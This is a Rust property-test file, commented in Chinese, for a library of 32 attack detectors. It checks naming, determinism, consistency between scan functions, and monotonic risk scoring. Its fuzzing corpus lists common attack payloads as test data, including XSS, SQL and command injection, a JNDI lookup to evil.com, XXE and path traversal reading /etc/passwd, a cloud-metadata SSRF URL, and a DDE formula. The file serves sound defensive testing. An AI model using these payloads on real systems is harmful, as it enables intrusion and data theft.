// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

//! 跨全部 32 个检测器的性质测试：名字、自洽、确定性、`scan_with` / `assess` 一致性、
//! 评分单调性。手写确定性伪随机（LCG + 固定种子），不引入任何依赖，失败可复现。

use security_rust::data::{
    CsvInjectionDetector, DeserializationDetector, FormulaInjectionDetector, JwtAttackDetector,
    MailHeaderDetector, PrototypePollutionDetector, ReDoSDetector,
};
use security_rust::file::{DataLeakDetector, PathTraversalDetector, UploadDetector};
use security_rust::injection::{
    CommandInjectionDetector, FormatStringDetector, GraphQlInjectionDetector,
    JndiInjectionDetector, LdapInjectionDetector, NoSqlInjectionDetector, SqlInjectionDetector,
    SsiInjectionDetector, SstiDetector, XPathInjectionDetector, XssDetector,
};
use security_rust::protocol::{
    CorsDetector, DnsRebindingDetector, HeaderInjectionDetector, HostHeaderDetector,
    HttpParameterPollutionDetector, Log4ShellDetector, OpenRedirectDetector,
    RequestSmugglingDetector, SsrfDetector, WebSocketDetector, XxeDetector,
};
use security_rust::score::{RiskLevel, total};
use security_rust::{AttackCategory, DetectionResult, Detector, Scanner, Severity, assess};

/// 与 `Scanner::default()` 内部注册的同一批检测器，直接构造以取得 `name()`。
/// 数量由 `all_detectors_are_registered_and_named` 锁死为 32。
fn detectors() -> Vec<Box<dyn Detector>> {
    vec![
        Box::new(XssDetector),
        Box::new(SqlInjectionDetector),
        Box::new(CommandInjectionDetector),
        Box::new(NoSqlInjectionDetector),
        Box::new(LdapInjectionDetector),
        Box::new(XPathInjectionDetector),
        Box::new(JndiInjectionDetector),
        Box::new(SsiInjectionDetector),
        Box::new(GraphQlInjectionDetector),
        Box::new(SstiDetector),
        Box::new(FormatStringDetector),
        Box::new(SsrfDetector),
        Box::new(XxeDetector),
        Box::new(HeaderInjectionDetector),
        Box::new(HostHeaderDetector),
        Box::new(RequestSmugglingDetector),
        Box::new(OpenRedirectDetector),
        Box::new(CorsDetector),
        Box::new(WebSocketDetector),
        Box::new(DnsRebindingDetector),
        Box::new(Log4ShellDetector),
        Box::new(HttpParameterPollutionDetector),
        Box::new(DeserializationDetector),
        Box::new(CsvInjectionDetector),
        Box::new(MailHeaderDetector),
        Box::new(JwtAttackDetector),
        Box::new(PrototypePollutionDetector),
        Box::new(FormulaInjectionDetector),
        Box::new(ReDoSDetector),
        Box::new(PathTraversalDetector),
        Box::new(UploadDetector),
        Box::new(DataLeakDetector),
    ]
}

fn names() -> Vec<&'static str> {
    detectors().iter().map(|d| d.name()).collect()
}

// ---------------------------------------------------------------- 确定性伪随机

/// 线性同余发生器（Numerical Recipes 常数）。固定种子 → 固定序列。
struct Lcg(u64);

impl Lcg {
    fn new(seed: u64) -> Self {
        Self(seed)
    }

    fn next_u64(&mut self) -> u64 {
        self.0 = self
            .0
            .wrapping_mul(6_364_136_223_846_793_005)
            .wrapping_add(1_442_695_040_888_963_407);
        self.0
    }

    fn below(&mut self, n: usize) -> usize {
        (self.next_u64() >> 33) as usize % n
    }
}

/// 攻击片段与噪声片段混合，保证随机语料既能命中、也有大量不命中的边角。
const FRAGMENTS: &[&str] = &[
    "<script>alert(1)</script>",
    "' OR '1'='1",
    "1 UNION SELECT password FROM users",
    "; cat /etc/passwd",
    "$(id)",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "../../../etc/passwd",
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
    "javascript:alert(1)",
    "http://169.254.169.254/latest/meta-data/",
    "Host: 127.0.0.1",
    "Transfer-Encoding: chunked",
    "Access-Control-Allow-Origin: *",
    "%0d%0aSet-Cookie: evil=true",
    "=cmd|' /C calc'!A0",
    "{\"__proto__\":{\"p\":1}}",
    "@evil.com\r\nBcc: victim",
    "eyJhbGciOiJub25lIn0.",
    // 噪声 / 元字符 / 畸形
    "",
    " ",
    "hello world",
    "\0",
    "\u{FFFD}",
    "(",
    "(?P<",
    "[",
    "\\",
    "--",
    "%",
    "'",
    "\u{1F600}",
    "\r\n",
    "=?",
];

fn random_inputs(seed: u64, count: usize) -> Vec<String> {
    let mut rng = Lcg::new(seed);
    (0..count)
        .map(|_| {
            let parts = 1 + rng.below(6);
            let mut s = String::new();
            for _ in 0..parts {
                s.push_str(FRAGMENTS[rng.below(FRAGMENTS.len())]);
            }
            s
        })
        .collect()
}

// ---------------------------------------------------------------------- 不变量

/// 1. 名字唯一、非空、snake_case。
#[test]
fn all_detectors_are_registered_and_named() {
    let names = names();
    assert_eq!(names.len(), 32, "检测器数量变了，同步更新本文件");

    let mut sorted = names.clone();
    sorted.sort_unstable();
    let before = sorted.len();
    sorted.dedup();
    assert_eq!(sorted.len(), before, "检测器名字重复: {sorted:?}");

    for n in &names {
        assert!(!n.is_empty(), "检测器名字为空");
        assert!(
            n.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '_'),
            "检测器名字不是 snake_case: {n:?}"
        );
        assert!(
            !n.starts_with('_') && !n.ends_with('_') && !n.contains("__"),
            "检测器名字下划线位置异常: {n:?}"
        );
    }
}

/// 2. `name()` 对同一实例恒定（扫过 100 个输入后仍不变）。
#[test]
fn name_is_constant_across_inputs() {
    let inputs = random_inputs(0x5EED_0001, 100);
    for d in detectors() {
        let expected = d.name();
        for input in &inputs {
            let _ = d.detect(input);
            assert_eq!(d.name(), expected, "name() 在扫描过程中变了");
        }
    }
}

/// 3. 检测器报出的 `attack_type` 必须等于它自己的 `name()`。
#[test]
fn attack_type_equals_detector_name() {
    let inputs = random_inputs(0x5EED_0002, 200);
    let mut hits = 0usize;
    for d in detectors() {
        for input in &inputs {
            if let Some(r) = d.detect(input) {
                assert_eq!(
                    r.attack_type,
                    d.name(),
                    "attack_type 与检测器名不符: input={input:?}"
                );
                assert!(
                    !r.matched_pattern.is_empty(),
                    "命中但 matched_pattern 为空: {}",
                    d.name()
                );
                hits += 1;
            }
        }
    }
    assert!(hits >= 20, "随机语料只命中 {hits} 次，该检查接近空转");
}

/// 4. 确定性：同输入 `scan()` 两遍结果（含顺序）完全相同。
#[test]
fn scan_is_deterministic() {
    let scanner = Scanner::default();
    for input in random_inputs(0x5EED_0003, 200) {
        assert_eq!(
            scanner.scan(&input),
            scanner.scan(&input),
            "两次扫描结果不同: {input:?}"
        );
    }
}

/// 5. `scan_with(&[n])` 恰是 `scan()` 中 `attack_type == n` 的那些。
///
/// 顺带反查清单完整性：`scan()` 不会报出 32 个名字以外的检测器。
#[test]
fn scan_with_is_exactly_the_filtered_scan() {
    let scanner = Scanner::default();
    let names = names();
    for input in random_inputs(0x5EED_0004, 40) {
        let all = scanner.scan(&input);
        for r in &all {
            assert!(
                names.contains(&r.attack_type.as_str()),
                "scan 报出未知检测器 {}（清单不全）",
                r.attack_type
            );
        }
        for name in &names {
            let filtered: Vec<DetectionResult> = all
                .iter()
                .filter(|r| r.attack_type == *name)
                .cloned()
                .collect();
            assert_eq!(
                scanner.scan_with(&input, &[name]),
                filtered,
                "scan_with({name}) 与 scan 过滤结果不一致: input={input:?}"
            );
        }
        assert!(scanner.scan_with(&input, &[]).is_empty());
    }
}

/// 6. `assess` 与 `scan` 一致。
#[test]
fn assess_agrees_with_scan() {
    let scanner = Scanner::default();
    for input in random_inputs(0x5EED_0005, 200) {
        let scanned = scanner.scan(&input);
        let a = scanner.assess(&input);
        assert_eq!(a.results, scanned.len(), "assess.results 不一致: {input:?}");
        assert_eq!(a.score, total(&scanned), "assess.score 与权重和不一致");
        assert_eq!(a.level, security_rust::score::score(&scanned));
    }
}

/// 7a. 结果集是超集 ⇒ 风险等级不降低（构造超集，覆盖全部严重度组合）。
#[test]
fn risk_level_is_monotonic_under_superset() {
    let mut rng = Lcg::new(0x5EED_0006);
    for _ in 0..300 {
        let n = 1 + rng.below(6);
        let base = random_results(&mut rng, n);
        let mut extended = base.clone();
        let extra = 1 + rng.below(4);
        for _ in 0..extra {
            extended.push(random_result(&mut rng));
        }
        let (low, high) = (assess(&base).level, assess(&extended).level);
        assert!(
            high >= low,
            "超集等级反而更低: {low:?} → {high:?}（base {} 条 → {} 条）",
            base.len(),
            extended.len()
        );
    }
}

/// 7b. 真实输入上的同一性质。
#[test]
fn risk_level_is_monotonic_on_real_inputs() {
    let scanner = Scanner::default();
    for (small, big) in [
        (
            "1 UNION SELECT password FROM users",
            "1 UNION SELECT password FROM users <script>alert(1)</script>",
        ),
        (
            "../../../etc/passwd",
            "../../../etc/passwd ${jndi:ldap://evil.com/a}",
        ),
    ] {
        let b = scanner.scan(small);
        let a = scanner.scan(big);
        assert!(is_superset(&a, &b), "构造不成立，不是超集: {b:?} ⊄ {a:?}");
        assert!(
            assess(&a).level >= assess(&b).level,
            "超集等级更低: {:?} → {:?}",
            assess(&b).level,
            assess(&a).level
        );
    }
}

/// 8. 空输入恒干净。
#[test]
fn empty_input_is_clean() {
    let scanner = Scanner::default();
    assert!(scanner.scan("").is_empty());
    let a = scanner.assess("");
    assert_eq!(a.level, RiskLevel::None);
    assert_eq!(a.results, 0);
    assert_eq!(a.score, 0);
}

// ------------------------------------------------------------------ 构造辅助

/// 多重集包含：`b` 的每条结果都能在 `a` 里找到（含重复计数）。
fn is_superset(a: &[DetectionResult], b: &[DetectionResult]) -> bool {
    let mut pool = a.to_vec();
    for item in b {
        match pool.iter().position(|x| x == item) {
            Some(i) => {
                pool.swap_remove(i);
            }
            None => return false,
        }
    }
    true
}

fn random_result(rng: &mut Lcg) -> DetectionResult {
    let severity = match rng.below(4) {
        0 => Severity::Critical,
        1 => Severity::High,
        2 => Severity::Medium,
        _ => Severity::Low,
    };
    let category = match rng.below(4) {
        0 => AttackCategory::Injection,
        1 => AttackCategory::Protocol,
        2 => AttackCategory::Data,
        _ => AttackCategory::File,
    };
    DetectionResult {
        attack_type: format!("t{}", rng.below(32)),
        category,
        severity,
        matched_pattern: "p".repeat(1 + rng.below(8)),
        offset: rng.below(64),
        message: "m".to_string(),
    }
}

fn random_results(rng: &mut Lcg, n: usize) -> Vec<DetectionResult> {
    (0..n).map(|_| random_result(rng)).collect()
}
